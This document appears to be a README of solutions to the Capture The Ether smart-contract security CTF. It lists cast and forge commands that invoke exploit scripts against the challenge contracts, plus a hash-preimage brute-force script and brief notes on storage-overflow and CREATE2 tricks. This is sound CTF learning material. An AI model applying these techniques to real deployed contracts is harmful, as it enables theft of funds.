# Capture The Ether

NOTE: [Capture The Ether](https://capturetheether.com/) was deployed in the Ropsten network, but the network is currently deprecated.

**Challenges**
- [Warmup](#warmup)
  - [Deploy a contract](#deploy-a-contract)
  - [Call me](#call-me)
  - [Choose a nickname](#choose-a-nickname)
- [Lotteries](#lotteries)
  - [Guess the number](#guess-the-number)
  - [Guess the secret number](#guess-the-secret-number)
  - [Guess the random number](#guess-the-random-number)
  - [Guess the new number](#guess-the-new-number)
  - [Predict the future](#predict-the-future)
  - [Predict the block hash](#predict-the-block-hash)
- [Math](#math)
  - [Token sale](#token-sale)
  - [Token whale](#token-whale)
  - [Retirement fund](#retirement-fund)
  - [Mapping](#mapping)
  - [Donation](#donation)
  - [Fifty years](#fifty-years)
- [Accounts](#accounts)
  - [Fuzzy identity](#fuzzy-identity)
- [Miscellaneous](#miscellaneous)
  - [Assume ownership](#assume-ownership)
  - [Token bank](#token-bank)

## Warmup

### Deploy a contract
Just send a transaction via Metamask.

### Call me
```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "callme()"
```

### Choose a nickname
```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "setNickname(bytes32)" $(cast --to-bytes32 1)
```

## Lotteries

### Guess the number
```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "guess(uint8)" 42 --value 1ether
```

### Guess the secret number
```py
import sha3

for i in range(1 << 8):
    k = sha3.keccak_256()
    k.update(bytes([i]))
    if k.hexdigest() == "db81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365":
        print(i)
        break
```
Result: `170`

```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "guess(uint8)" 170 --value 1ether
```

### Guess the random number
```
$ cast storage $INSTANCE_ADDRESS 0
0x0000000000000000000000000000000000000000000000000000000000000066
```

```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "guess(uint8)" 0x66 --value 1ether
```

### Guess the new number
```
forge script src/CaptureTheEther/GuessTheNewNumber/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```

### Predict the future
```
forge test --match-path src/CaptureTheEther/PredictTheFuture/Exploit.t.sol
```

### Predict the block hash
```
forge test --match-path src/CaptureTheEther/PredictTheBlockHash/Exploit.t.sol
```

## Math

### Token sale
```
forge script src/CaptureTheEther/TokenSale/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```

### Token whale
```
forge script src/CaptureTheEther/TokenWhale/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```

### Retirement fund
```
forge script src/CaptureTheEther/RetirementFund/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```

### Mapping
```
forge script src/CaptureTheEther/Mapping/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```

### Donation
```
forge test --match-path src/CaptureTheEther/Donation/Exploit.t.sol
```

### Fifty years
<!--
- withdraw関数で引き出したい
- ownerはプレイヤー
- upsert関数のelseにおいて、contribution変数が定義されていないのにもかかわらず使えてしまう
- unlockTimestamp + 1 daysでオーバーフローを起こせる
- SSTOREでslot 0がmsg.valueに書き換え
  - slot 0はqueueの要素数が格納されている
  - msg.valueを1にする
- 配列の長さであるslot 0をインクリメントしてからpushを行うため、amountが+1される
-->
```
forge test --match-path src/CaptureTheEther/FiftyYears/Exploit.t.sol
```

## Accounts

### Fuzzy identity
<!--
- CREATE2でデプロイされるアドレスを全探索すればよい
- 2^28なので1分もかからない
-->
```
forge test --match-path src/CaptureTheEther/FuzzyIdentity/Exploit.t.sol
```

## Miscellaneous

### Assume ownership
```
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "AssumeOwmershipChallenge()" 
cast send --private-key $PRIVATE_KEY $INSTANCE_ADDRESS "authenticate()"
```

### Token bank
```
forge script src/CaptureTheEther/TokenBank/Exploit.s.sol:ExploitScript --private-key $PRIVATE_KEY --broadcast -s "run(address)" $INSTANCE_ADDRESS
```
